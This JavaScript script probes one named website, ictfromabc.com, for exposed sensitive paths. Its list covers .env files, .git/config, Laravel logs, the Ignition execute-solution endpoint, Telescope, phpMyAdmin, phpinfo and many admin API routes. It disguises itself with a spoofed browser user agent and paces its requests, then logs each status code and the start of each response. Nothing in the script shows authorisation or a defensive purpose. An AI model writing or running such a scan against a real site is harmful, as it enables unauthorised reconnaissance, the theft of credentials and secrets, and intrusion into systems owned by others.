const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const paths=['/.env','/.env.bak','/.git/config','/.git/HEAD','/composer.json','/composer.lock','/package.json','/storage/logs/laravel.log','/_ignition/health-check','/_ignition/execute-solution','/telescope','/telescope/requests','/horizon','/debugbar','/phpinfo.php','/server-status','/admin/index.php','/admin/login.php','/administrator','/phpmyadmin','/wp-admin','/api/admin','/api/admin/','/api/admin/profile','/api/admin/me','/api/admin/settings','/api/admin/users','/api/admin/courses/all','/api/admin/lessons/all','/api/admin/videos/all','/api/admin/stats'];
for(const p of paths){
 try{
  const r=await fetch('https://ictfromabc.com'+p,{headers:{'User-Agent':UA,Accept:'*/*'},redirect:'manual'});
  const t=await r.text();
  console.log(String(r.status).padEnd(4),p.padEnd(35),'len='+t.length,t.slice(0,80).replace(/\s+/g,' '));
 }catch(e){console.log('ERR',p,e.message);}
 await new Promise(r=>setTimeout(r,700));
}
